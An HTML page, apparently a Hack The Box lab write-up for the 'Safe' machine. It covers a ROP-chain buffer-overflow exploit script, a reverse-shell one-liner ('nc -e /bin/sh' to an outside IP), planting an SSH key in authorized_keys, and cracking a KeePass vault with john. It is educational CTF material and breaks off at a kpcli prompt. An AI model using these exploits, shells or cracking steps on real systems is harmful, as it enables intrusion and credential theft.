@@ -1,0 +1,392 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Hack The Box: Safe — a 20-point Linux box. Binary-exploitation / ROP foothold, then a KeePass vault keyed by an image file for root. Write-up by David Benson (db-d2).">
+<link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2NCA2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiByeD0iMTQiIGZpbGw9IiMxNDFhMjQiLz48aW1hZ2UgaHJlZj0iZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFFQUFBQUJBQ0FZQUFBQ3FhWEhlQUFBQUNYQklXWE1BQUE3RUFBQU94QUdWS3c0YkFBQUR4a2xFUVZSNDJ1MmJPMmdVVVJTRy83T0VJQ0dFTlFRSnFVS0tGS2tpaUlLSWpaVVNHeEhSVGhBeHBXaWhpS25TS0dJcFZnSEZRa0hCd2pvR0ZTMVVTRUJRRk9LclVZeVBhRUNOcUovRlhtVWRaK2V4TTdNN0UrZUhhVGJubnNlZnVlZitkKzlkVTRzQWRFamFLR21McEZGSmc1SjYzSjgvU1hvdWFVN1N0S1E3WnZaZEt3RkFIekFKdkNJNlhya3hmVVV1dkFJY0JEN1NQRDQ2SDVXaUZiOEdtQWtwN2dGdzFqMFBRbXhuZ0RWRktYNEltQThvWmduWUNkU1BrZnRzS1dEY1BEQ1U5K0w3UTRvSEdBc1lQeFl5ZGo2M2J3TFFBZHdLS2VCMkJEKzNRM3pjY0N0S0traXp1UnlTdENuRTVub0VQMkUybTEycy9CQUE5RXVhaUdDNm5KTE5oSXVabXpmZ3NLVHVDSFliVXJMcGRqRnpNZmM3Z1hjUjEvVWZ3R2lBcjFGbkV3WHZnTTQ4RUxBdHByaDVCb3o0K0JrQlhuaHNsNEh6d0JsZ3djZlh0andRY0xvSmhiY01YQURHM1hQQmZkYXdRR0RRUjFXZXpnTUJNMlNERno2eExuc1ZZaDZhNEdCRzNQWUNYWjdQQnRLT25RWUIxWXdJNkpZMEJmUzZSbnZNYmFkVGpXMHBUSUVQR1pJZ1NUL2Q0NmYrRnMxc2RSTG5IY28vS2lrcjF0UUoyQ2VwWGV2eE41WElzQWU0cmVkbVNkNnZwdDZhMlJWbnMxZlNxamJsLzlYTXpyazhkdnJsS2VtbW1iMkoyOWdFSEFlK05GaWpaK3ViSU8zRGg3bzhaaHZZZkhHMXhPb0JSeVZOcnBDM2ZKV3I1YnVrRTZFNkFPaUp1TFV0R2laY2JhRkNhS09rcmhWSVFKZVBrUEtkQW1tS21pZVNqcWgyNk5Hc3pENHBhVGlsZktxdEZFSS9KVzAzc3ljSmZNd0JEeVU5eWtvTVpYbmdzSml3K05vNlhmT3htS1hNekFxOXdMb1U5aHJySlBYbVdRb0g0Um93S2VscGsrT0hzbDZSc2lhZ1g5S1p2TyswL211VUJQenZCR1RkQTE0N0haNjBDZllYbFlEdFpuWS80VEo0VjlLOUlrNkI5MG1MZDBMb3ZxVDNSU1NnQ2lUVzhNNUh0WWhUb09LRVVCcWJvVXBSZThDd3BLdmxNbGdTVUJKUUVsQVNVQkpRRWxBU1VCSlFFbEFTVUJKUUJBS2lYSG10UDJSODJjYjhYemJJcVJIQ2F3T21JNTdOcjNmMkE4RGpOdHdOZUF3TXVCeldSeHd6SGZybFE0eTd1bE4xNDFwTndwL2lYZnlwR0hlVmg0TUlPQlVqaWFYNjgvWVdrdUF0dmlma3B6WmVuR3BVZkdlREM4bEJHUGY0eUpxRXY0cDNNY2RqK2xpb3YyVnVkWTUyUzdvWXN3bk5tZGxhTDVISzdvTEZaelA3NW9rM3E5b1BNZU5najVsZGFyYjUrVGJEZGlCRzh3dHVoakdiWDhObTJBWUNwcHJNK1U4ei9LMEQ5aWNRUmJ2OExoKzFvUGdlU2JzUzZKLzlTWnBmWUROc0VRSGpDWE5lQURvcmtuYm8zeHVXY1hHZ0RUTWdhY3crU1RzNkpHMVY4d2NYdjFFRlJzenNZWXYrK3lPcW5SWWx6WHZyTDJnUnBkVUFXVkhtQUFBQUFFbEZUa1N1UW1DQyIgeD0iOSIgeT0iOSIgd2lkdGg9IjQ2IiBoZWlnaHQ9IjQ2Ii8+PC9zdmc+">
+<title>Safe — HTB Write-up · db-d2</title>
+<style>
+  :root {
+    --font-mono: ui-monospace, "SF Mono", SFMono-Regular, "JetBrains Mono", Menlo, Consolas, "Liberation Mono", monospace;
+    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, "Helvetica Neue", Arial, sans-serif;
+    --bg: #0d1017; --bg-raised: #141a24; --bg-inset: #090c12; --term-bg: #090c12; --term-ink: #cdd7e6;
+    --border: #232c3a; --border-soft: #1a2230; --ink: #dfe6f0; --ink-dim: #97a4b8; --ink-faint: #5f6b7e;
+    --accent: #f4a94b; --accent-ink: #1a1204; --signal: #63cddb; --crit: #f7546a; --ok: #5fd68a;
+    --shadow: 0 1px 0 rgba(255,255,255,.02), 0 18px 40px -24px rgba(0,0,0,.8);
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+  body { margin: 0; background: var(--bg); color: var(--ink); font-family: var(--font-sans); line-height: 1.65; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
+  .wrap { max-width: 940px; margin: 0 auto; padding: 0 24px; }
+  a { color: var(--signal); text-decoration: none; border-bottom: 1px solid color-mix(in srgb, var(--signal) 35%, transparent); }
+  a:hover { border-bottom-color: var(--signal); }
+  a:focus-visible { outline: 2px solid var(--accent); outline-offset: 3px; border-radius: 2px; }
+  .mono { font-family: var(--font-mono); }
+
+  .hero { border-bottom: 1px solid var(--border); background: radial-gradient(120% 90% at 85% -10%, color-mix(in srgb, var(--accent) 12%, transparent), transparent 55%), var(--bg-inset); padding: 40px 0 52px; }
+  .hero-inner { display: flex; flex-direction: column; gap: 20px; animation: rise .7s cubic-bezier(.2,.7,.2,1) both; }
+  .crumb { font-size: .76rem; color: var(--ink-faint); letter-spacing: .04em; }
+  .crumb a { color: var(--ink-dim); border: none; }
+  .crumb a:hover { color: var(--accent); }
+  .prompt-line { font-family: var(--font-mono); font-size: .82rem; color: var(--ink-dim); display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-top: 6px; }
+  .prompt-line .u { color: var(--accent); } .prompt-line .p { color: var(--signal); }
+  h1.title { font-family: var(--font-mono); font-weight: 700; font-size: clamp(2.9rem, 9vw, 5.4rem); line-height: .95; letter-spacing: -.02em; margin: 0; text-wrap: balance; }
+  h1.title .cursor { display: inline-block; width: .56ch; height: .9em; margin-left: .12em; background: var(--accent); transform: translateY(.06em); animation: blink 1.1s steps(1) infinite; }
+  .thesis { font-size: clamp(1.05rem, 2.4vw, 1.3rem); color: var(--ink-dim); max-width: 46ch; margin: 0; }
+  .thesis strong { color: var(--ink); font-weight: 600; }
+  .meta-row { display: flex; flex-wrap: wrap; gap: 8px 28px; font-family: var(--font-mono); font-size: .78rem; color: var(--ink-faint); padding-top: 6px; }
+  .meta-row b { color: var(--ink-dim); font-weight: 500; }
+
+  .chain { display: grid; grid-template-columns: 1fr; gap: 14px; margin: 40px 0 8px; }
+  @media (min-width: 640px) { .chain { grid-template-columns: 1fr 1fr; } }
+  .node { background: var(--bg-raised); border: 1px solid var(--border); border-radius: 12px; padding: 16px 16px 18px; position: relative; box-shadow: var(--shadow); }
+  .node .tier { font-family: var(--font-mono); font-size: .7rem; letter-spacing: .16em; color: var(--ink-faint); text-transform: uppercase; }
+  .node .who { font-family: var(--font-mono); font-size: 1.35rem; font-weight: 700; margin: 6px 0 2px; color: var(--ink); }
+  .node .via { font-size: .82rem; color: var(--ink-dim); }
+  .node.root .who { color: var(--accent); }
+  .node .arrow { display: none; position: absolute; right: -20px; top: 50%; transform: translateY(-50%); color: var(--ink-faint); font-family: var(--font-mono); font-size: 1.1rem; z-index: 2; }
+  @media (min-width: 640px) { .node:not(:last-child) .arrow { display: block; } }
+
+  .card { display: block; width: 100%; max-width: 460px; margin: 30px 0 0; border: 1px solid var(--border); border-radius: 12px; box-shadow: var(--shadow); }
+
+  section { padding: 44px 0; border-bottom: 1px solid var(--border-soft); }
+  .sec-head { display: flex; align-items: baseline; gap: 16px; margin: 0 0 22px; }
+  .sec-num { font-family: var(--font-mono); font-weight: 700; font-size: 1rem; color: var(--accent); flex: none; padding-top: .15em; }
+  h2 { font-size: clamp(1.5rem, 3.4vw, 2.05rem); line-height: 1.15; margin: 0; letter-spacing: -.01em; text-wrap: balance; }
+  h2 .sub { display: block; font-family: var(--font-mono); font-size: .78rem; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-faint); font-weight: 500; margin-top: 8px; }
+  p { margin: 0 0 16px; max-width: 72ch; }
+  .lede { color: var(--ink-dim); }
+  .code { font-family: var(--font-mono); font-size: .86em; background: var(--bg-inset); border: 1px solid var(--border-soft); padding: .08em .4em; border-radius: 5px; color: var(--ink); white-space: nowrap; }
+
+  .term { background: var(--term-bg); border: 1px solid var(--border); border-radius: 11px; overflow: hidden; margin: 18px 0 22px; box-shadow: var(--shadow); }
+  .term-bar { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid rgba(255,255,255,.06); background: rgba(255,255,255,.02); }
+  .term-bar .lamp { width: 11px; height: 11px; border-radius: 50%; background: #2c3644; }
+  .term-bar .lamp.a { background: #e05b5b; } .term-bar .lamp.b { background: #e0b24f; } .term-bar .lamp.c { background: #4faf6a; }
+  .term-bar .label { margin-left: 8px; font-family: var(--font-mono); font-size: .72rem; color: #6d7a8c; letter-spacing: .05em; }
+  .term-scroll { overflow-x: auto; }
+  pre.term-body { margin: 0; padding: 16px 18px; font-family: var(--font-mono); font-size: .84rem; line-height: 1.7; color: var(--term-ink); min-width: max-content; }
+  pre.term-body .c { color: #6b7787; }
+  pre.term-body .pr { color: #63cddb; }
+  pre.term-body .cmd { color: #e8eef6; }
+  pre.term-body .out { color: #8b98aa; }
+  pre.term-body .hi { color: #f4a94b; }
+  pre.term-body .win { color: #5fd68a; }
+
+  .callout { border: 1px solid var(--border); border-left: 3px solid var(--accent); background: var(--bg-raised); border-radius: 10px; padding: 18px 20px; margin: 22px 0; }
+  .callout .k { font-family: var(--font-mono); font-size: .72rem; letter-spacing: .16em; text-transform: uppercase; color: var(--accent); display: block; margin-bottom: 8px; }
+  .callout p:last-child { margin-bottom: 0; }
+
+  .shot { display: block; width: 100%; margin: 6px 0 6px; border: 1px solid var(--border); border-radius: 10px; }
+  .gif { display: block; max-width: 340px; width: 100%; margin: 16px 0; border: 1px solid var(--border); border-radius: 10px; }
+
+  .flags { display: grid; grid-template-columns: 1fr; gap: 14px; margin-top: 6px; }
+  @media (min-width: 600px) { .flags { grid-template-columns: 1fr 1fr; } }
+  .flag { background: var(--bg-raised); border: 1px solid var(--border); border-radius: 11px; padding: 18px 20px; display: flex; flex-direction: column; gap: 8px; }
+  .flag .name { font-family: var(--font-mono); font-size: .74rem; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-faint); }
+  .flag .path { font-family: var(--font-mono); font-size: .82rem; color: var(--ink-dim); }
+  .flag .val { font-family: var(--font-mono); font-size: .9rem; letter-spacing: .18em; color: var(--ink); }
+  .flag.root { border-color: color-mix(in srgb, var(--accent) 40%, var(--border)); }
+  .flag.root .val { color: var(--accent); }
+  .flag .status { font-family: var(--font-mono); font-size: .72rem; color: var(--ok); display: inline-flex; align-items: center; gap: 6px; }
+  .flag .status::before { content: "●"; font-size: .7em; }
+
+  footer { padding: 44px 0 60px; color: var(--ink-faint); font-family: var(--font-mono); font-size: .78rem; }
+  footer .paths { display: flex; flex-direction: column; gap: 5px; margin-top: 14px; }
+
+  @keyframes rise { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: none; } }
+  @keyframes blink { 0%, 50% { opacity: 1; } 50.01%, 100% { opacity: 0; } }
+  @media (prefers-reduced-motion: reduce) { .hero-inner { animation: none; } h1.title .cursor { animation: none; } }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="crumb mono"><a href="../index.html">cd ..</a> &nbsp;/&nbsp; all write-ups</div>
+    <div class="prompt-line mono">
+      <span><span class="u">db-d2</span>@<span class="p">kali</span>:~$</span>
+      <span>./pwn safe.htb</span>
+    </div>
+    <h1 class="title">Safe<span class="cursor" aria-hidden="true"></span></h1>
+    <p class="thesis">A 20-point Linux box where <strong>the foothold is a binary-exploitation / ROP chain</strong> against a custom service on port 1337. It gets much easier after that, and the ROP itself is fairly straightforward.</p>
+    <div class="meta-row">
+      <span><b>target</b> 10.10.10.147</span>
+      <span><b>platform</b> HackTheBox · Linux</span>
+      <span><b>difficulty</b> Easy · 20 pts</span>
+      <span><b>tags</b> RCE · ROP · enum</span>
+      <span><b>status</b> rooted</span>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <div class="chain" aria-label="Privilege path">
+    <div class="node">
+      <div class="tier">Foothold · user</div>
+      <div class="who">user</div>
+      <div class="via">ROP chain on the :1337 binary</div>
+      <div class="arrow" aria-hidden="true">→</div>
+    </div>
+    <div class="node root">
+      <div class="tier">Privesc · root</div>
+      <div class="who">root</div>
+      <div class="via">KeePass vault, keyed by an image file</div>
+    </div>
+  </div>
+
+  <img class="card" src="img/safe_card.png" alt="Safe box info card" loading="lazy">
+
+  <section>
+    <div class="sec-head"><span class="sec-num">01</span><h2>Recon<span class="sub">nmap · two open ports</span></h2></div>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">nmap -sC -sV</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~/hack_the_box$</span> <span class="cmd">nmap -sC -sV -sT -o safe_map 10.10.10.147</span>
+Starting Nmap 7.80 ( https://nmap.org )
+Nmap scan report for 10.10.10.147
+Host is up (0.027s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre></div></div>
+    <p class="lede">So we have HTTP on 80 and SSH on 22. Let's check the HTTP site.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">02</span><h2>Web enumeration<span class="sub">port 80 → myapp on 1337</span></h2></div>
+    <img class="shot" src="img/safe_http.png" alt="Default Apache page on port 80" loading="lazy">
+    <p>Looks like the default Apache page — but let's inspect the source anyway.</p>
+    <img class="shot" src="img/safe_http_src.png" alt="Page source revealing myapp on port 1337" loading="lazy">
+    <p>So <span class="code">myapp</span> is running on port 1337 and it's available for download. Let's poke at the service first.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">nc 10.10.10.147 1337</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~/hack_the_box$</span> <span class="cmd">nc 10.10.10.147 1337</span>
+ 21:05:13 up 27 min,  0 users,  load average: 0.00, 0.00, 0.00
+hello
+
+What do you want me to echo back? hello</pre></div></div>
+    <p>Not much here. Let's grab <span class="code">myapp</span> and take a look.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">wget / run myapp</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~/hack_the_box$</span> <span class="cmd">wget http://10.10.10.147/myapp</span>
+Length: 16592 (16K) [application/octet-stream]
+Saving to: 'myapp'
+myapp 100%[=================================&gt;]  16.20K  --.-KB/s  in 0.05s
+
+<span class="pr">db-d2@kali:~/hack_the_box$</span> <span class="cmd">chmod +x myapp</span>
+<span class="pr">db-d2@kali:~/hack_the_box$</span> <span class="cmd">./myapp</span>
+ 21:43:47 up 58 min,  3 users,  load average: 0.01, 0.01, 0.00
+
+What do you want me to echo back? bob
+bob</pre></div></div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">03</span><h2>The overflow<span class="sub">myapp · NX means ROP</span></h2></div>
+    <p>Okay, so we have a pretty basic app: it prints uptime, takes input, and echoes it back. Let's see if there's a buffer overflow in here.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">fuzzing the input</span></div><div class="term-scroll"><pre class="term-body">What do you want me to echo back? yipyipyipyipyipyipyipyipyipyip...
+...
+Segmentation fault</pre></div></div>
+    <p>And jackpot. Let's break it open in gdb and run <span class="code">checksec</span> (btw, if you're not using <a href="https://github.com/longld/peda">Peda</a>, install it now).</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">gdb-peda $ checksec</span></div><div class="term-scroll"><pre class="term-body">Reading symbols from ./myapp...
+(No debugging symbols found in ./myapp)
+<span class="pr">gdb-peda$</span> <span class="cmd">checksec</span>
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</pre></div></div>
+    <div class="callout"><span class="k">Why it has to be ROP</span><p>NX is enabled, so I can't just drop shellcode on the stack and execute it. That rules out the easy path and forces a return-oriented chain — reuse code that's already in the binary. Oh, darn.</p></div>
+    <p>First I need the offset, so let's create a pattern and see where it lands in the RIP.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">pattern create 200  →  SIGSEGV</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">gdb-peda$</span> <span class="cmd">pattern create 200</span>
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHA...'
+
+<span class="pr">gdb-peda$</span> <span class="cmd">r</span>
+ 21:10:11 up 10 days, 24 min,  2 users,  load average: 0.00, 0.00, 0.00
+What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA...
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RBP: 0x41414e4141384141 ('AA8AANAA')
+RSP: 0x7fffffffe448 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+RIP: 0x4011ac (&lt;main+77&gt;:	ret)
+[-------------------------------------code-------------------------------------]
+   0x4011ab &lt;main+76&gt;:	leave
+=&gt; 0x4011ac &lt;main+77&gt;:	ret
+Stopped reason: SIGSEGV</pre></div></div>
+    <p>We stopped on <span class="code">ret</span> as it tried to load the next stack item into RIP. Awesome — let's own the RIP. I'll copy out <span class="code">jAA9AAOA</span> and use it to locate the offset.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">pattern_offset</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">gdb-peda$</span> <span class="cmd">pattern_offset jAA9AAOA</span>
+jAA9AAOA found at offset: 120</pre></div></div>
+    <p>Now I'll create a fresh 120-byte pattern and tack 8 junk chars on the end to confirm control.</p>
+    <img class="gif" src="img/Hellothere.gif" alt="Hello there" loading="lazy">
+    <p>Great — after 120 bytes I can overwrite the stack and control the RIP (return instruction pointer). And if I own the RIP, I own the program. Time to plan the exploit.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">04</span><h2>Building the ROP<span class="sub">system() + a gadget + test()</span></h2></div>
+    <p>First, what do I have to work with?</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">gdb-peda $ info functions</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">gdb-peda$</span> <span class="cmd">info functions</span>
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401040  system@plt
+0x0000000000401050  printf@plt
+0x0000000000401060  gets@plt
+0x0000000000401070  _start
+0x0000000000401152  test
+0x000000000040115f  main</pre></div></div>
+    <p>Aha — I have <span class="code">system()</span> right there, so I don't need to bother leaking an address. Let's check out the totally-not-suspicious <span class="code">test</span> function.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">gdb-peda $ disassemble test</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">gdb-peda$</span> <span class="cmd">disassemble test</span>
+Dump of assembler code for function test:
+   0x0000000000401152 &lt;+0&gt;:	push   rbp
+   0x0000000000401153 &lt;+1&gt;:	mov    rbp,rsp
+   0x0000000000401156 &lt;+4&gt;:	mov    rdi,rsp
+   0x0000000000401159 &lt;+7&gt;:	jmp    r13
+   0x000000000040115d &lt;+11&gt;:	pop    rbp
+   0x000000000040115e &lt;+12&gt;:	ret
+End of assembler dump.</pre></div></div>
+    <div class="callout"><span class="k">The primitive</span><p><span class="code">test</span> moves whatever is in RBP into RDI, then jumps to whatever is in R13. <span class="code">system()</span> runs whatever is in RDI as a command — so if I get <span class="code">/bin/sh</span> into RBP and the address of <span class="code">system()</span> into R13, I get a shell. From the crash, I own the RIP after 120 bytes and RBP 8 bytes before that.</p></div>
+    <p>So let's go gadget hunting.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">ropper --search &#x27;pop r13&#x27;</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~/hack_the_box$</span> <span class="cmd">ropper --file ./myapp --search "pop r13"</span>
+[INFO] Searching for gadgets: pop r13
+
+[INFO] File: ./myapp
+0x0000000000401206: pop r13; pop r14; pop r15; ret;</pre></div></div>
+    <p>I'm starting to see why this is a 20-point box. I can use this gadget to load the address of <span class="code">system()</span> into R13, toss junk into R14/R15, <span class="code">ret</span> into <span class="code">test()</span>, and I'm in. I know there are plenty of tools that make this even easier (like <a href="http://docs.pwntools.com/en/stable/">Pwntools</a>) — but this is a learning exercise, so…</p>
+    <img class="gif" src="img/myway.gif" alt="I prefer it my way" loading="lazy">
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">exploit.py</span></div><div class="term-scroll"><pre class="term-body">from struct import *
+
+buf = ""
+buf += "/bin/sh\x00" *15             <span class="c"># /bin/sh sled because it's cooler than a NOP sled</span>
+buf += pack("&lt;Q", 0x401203)          <span class="c"># pop rbp r12-r15 ret</span>
+buf += "/bin/sh\x00"                 <span class="c"># load /bin/sh into rbp which later goes into rdi</span>
+buf += "A" *8                        <span class="c"># junk r12</span>
+buf += pack("&lt;Q", 0x401040)          <span class="c"># call system@plt  arg[0] = rdi</span>
+buf += "B" *16                       <span class="c"># junk r14 r15</span>
+buf += pack("&lt;Q", 0x401152)          <span class="c"># call test - load /bin/sh into rdi and jmp to system</span>
+print buf</pre></div></div>
+    <p>This is what the stack should look like if I did it right — <span class="code">/bin/sh</span> in RBP/RSP, <span class="code">system@plt</span> in R13, sitting on the <span class="code">do_system</span> <span class="code">ret</span>.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">verifying the stack in gdb</span></div><div class="term-scroll"><pre class="term-body">[----------------------------------registers-----------------------------------]
+RBP: 0x7fffffffe478 --&gt; 0x68732f6e69622f ('/bin/sh')
+RSP: 0x7fffffffe478 --&gt; 0x68732f6e69622f ('/bin/sh')
+RIP: 0x7ffff7e29c24 (&lt;do_system+676&gt;:	ret)
+R13: 0x401040 (&lt;system@plt&gt;:	jmp    QWORD PTR [rip+0x2fda])
+R14: 0x4242424242424242 ('BBBBBBBB')</pre></div></div>
+    <p>Let's test it locally.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">local test</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~/hack_the_box$</span> <span class="cmd">(cat payload ; cat) | ./myapp</span>
+ 00:17:41 up 22 days,  3:32,  2 users,  load average: 0.00, 0.11, 0.09
+
+What do you want me to echo back? /bin/sh
+whoami
+db-d2</pre></div></div>
+    <p>Looks like we're ready to fire this at the box.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">05</span><h2>user.txt<span class="sub">fire the exploit, then upgrade the shell</span></h2></div>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">(cat payload ; cat) | nc 10.10.10.147 1337</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~/hack_the_box$</span> <span class="cmd">(cat payload ; cat) | nc 10.10.10.147 1337</span>
+ 00:27:11 up 1 min,  0 users,  load average: 0.12, 0.08, 0.03
+whoami
+user
+ls /home/user
+IMG_0545.JPG   IMG_0546.JPG   IMG_0547.JPG   IMG_0548.JPG
+IMG_0552.JPG   IMG_0553.JPG   myapp   MyPasswords.kdbx   user.txt
+cat /home/user/user.txt
+7********************</pre></div></div>
+    <p>First, let's get a better shell.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">no python, no nc</span></div><div class="term-scroll"><pre class="term-body">python -c 'import pty; pty.spawn("/bin/bash")'
+/bin/sh: 6: python: not found
+nc -e /bin/sh 10.10.16.143 4444
+/bin/sh: 7: nc: not found</pre></div></div>
+    <p>I guess it can't <em>all</em> be easy. More enumeration, then — SSH is listening, so let's check its config.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">cat /etc/ssh/sshd_config</span></div><div class="term-scroll"><pre class="term-body">cat /etc/ssh/sshd_config
+<span class="c"># This is the sshd server system-wide configuration file.</span>
+<span class="c"># Uncommented options override the default value.</span>
+
+<span class="c">#Port 22</span>
+<span class="c">#PermitRootLogin prohibit-password</span>
+<span class="c">#PubkeyAuthentication yes</span>
+<span class="c">#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2</span>
+<span class="c">#PasswordAuthentication yes</span>
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+Subsystem	sftp	/usr/lib/openssh/sftp-server
+[ ... stock, unmodified Debian config; trimmed ... ]</pre></div></div>
+    <p>… I mean, it <em>is</em> 20 points. Pubkey auth is on and the home directory is writable, so I drop my key into <span class="code">authorized_keys</span> and SSH straight in as a proper user.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">drop key → ssh in</span></div><div class="term-scroll"><pre class="term-body">echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFB[snip]" &gt;&gt; /home/user/.ssh/authorized_keys
+
+<span class="pr">db-d2@kali:/etc/ssh$</span> <span class="cmd">ssh -i ~/id_rsa_generated user@10.10.10.147</span>
+Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64
+user@safe:~$</pre></div></div>
+    <p>That's better.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">06</span><h2>root.txt<span class="sub">a KeePass vault keyed by a photo</span></h2></div>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">user@safe $ ls</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">user@safe:~$</span> <span class="cmd">ls</span>
+IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG  myapp  MyPasswords.kdbx  user.txt</pre></div></div>
+    <p>A KeePass database sitting next to a set of image files — so one of those images is almost certainly the vault's key file. I'll scp the files down so I can run john locally.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">scp the loot</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~/hack_the_box/safe$</span> <span class="cmd">scp -i ~/id_rsa_generated user@10.10.10.147:~/IMG* .</span>
+IMG_0545.JPG   100% 1863KB   3.5MB/s   00:00
+IMG_0547.JPG   100% 2470KB  10.2MB/s   00:00
+<span class="pr">db-d2@kali:~/hack_the_box/safe$</span> <span class="cmd">scp -i ~/id_rsa_generated user@10.10.10.147:~/*.kdbx .</span>
+MyPasswords.kdbx   100% 2446    26.8KB/s   00:00</pre></div></div>
+    <p>It takes some trial and error, but there are only six files — and <span class="code">IMG_0547.JPG</span> is the ticket in.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">keepass2john → john</span></div><div class="term-scroll"><pre class="term-body">keepass2john -k IMG_0547.JPG ./MyPasswords.kdbx &gt; hash.txt
+john -w=/usr/share/wordlists/rockyou.txt ./hash.txt --format=KeePass
+0g 0:00:00:00 DONE (2020-10-10 01:21) 177100p/s  123456..sss
+MyPasswords:bullshit
+
+1 password hash cracked, 0 left</pre></div></div>
+    <img class="gif" src="img/really.gif" alt="really?" loading="lazy">
+    <p>With the key file and the cracked master password, kpcli opens the vault and hands over the root password.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">kpcli — open the vault</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~/hack_the_box/safe$</span> <span class="cmd">kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx</span>
+Please provide the master password: *************************
+
